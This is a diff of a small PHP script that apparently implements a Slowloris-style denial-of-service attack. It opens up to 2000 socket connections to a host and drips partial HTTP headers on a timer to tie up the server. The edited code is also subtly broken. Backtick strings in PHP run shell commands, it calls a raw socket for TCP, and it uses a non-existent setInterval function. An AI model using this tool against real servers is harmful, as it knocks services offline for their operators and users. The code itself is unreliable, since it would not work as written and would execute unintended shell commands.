@@ -1,7 +1,16 @@
 <?php
 
+print('Started...');
+
 class Details{
-    public function __construct($host, $no_of_sockets, $rate, $port=3001, $method='GET', $path='/')
+    public $host;
+    public $port;
+    public $no_of_sockets;
+    public $rate;
+    public $method;
+    public $path;
+
+    public function __construct($host, $no_of_sockets, $rate, $port=5500, $method='GET', $path='/')
     {
         $this->host = $host;
         $this->port = $port;
@@ -21,18 +30,18 @@ class Details{
     }
 
     public function start(){
-        define('msg', $this->method + $this->path + ' HTTP/1.1\n',false);
-        $socket= socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create Socket\n");
+        define('msg', `{$this->method} {$this->path} HTTP/1.1\n`,false);
+        $socket= socket_create(AF_INET, SOCK_RAW, 0) or die("Could not create Socket\n");
         socket_connect($socket, $this->host,$this->port) or die('Couldnt Connect to Socket\n');
-        socket_write($socket, msg, strlen(msg)) or die('Couldnt Write ');
+        socket_write($socket, msg) or die('Couldnt Write ');
         print('Socket Activated');
-        socket_write($socket, 'Host: ${opts.host}\n', strlen('Host: ${opts.host}\n'));
+        socket_write($socket, `Host: {$this->host}\n`);
         $sentPacket=0;
         $this->setInterval(function(){
             global $socket;
             global $sentPacket;
             if($socket){
-                socket_write($socket, `x-header-${$sentPacket}: ${$sentPacket}\n`, strlen('`x-header-${n}: ${n}\n`'));
+                socket_write($socket, `x-header-${$sentPacket}: ${$sentPacket}\n`);
                 $sentPacket+=1;
             }
         }, $this->rate);
@@ -41,12 +50,18 @@ class Details{
         
     }
 
+    public function stop(){
+        exit('Done Executing');
+    }
+
 }
 
 $instance = new Details('localhost',2000,600);
 
-for($i=0;$i<$instance;$i++){
-
+for($i=0;$i<$instance->no_of_sockets;$i++){
+    print('init');
+    $instance->start();
 }
+$instance->stop();
 
 ?>
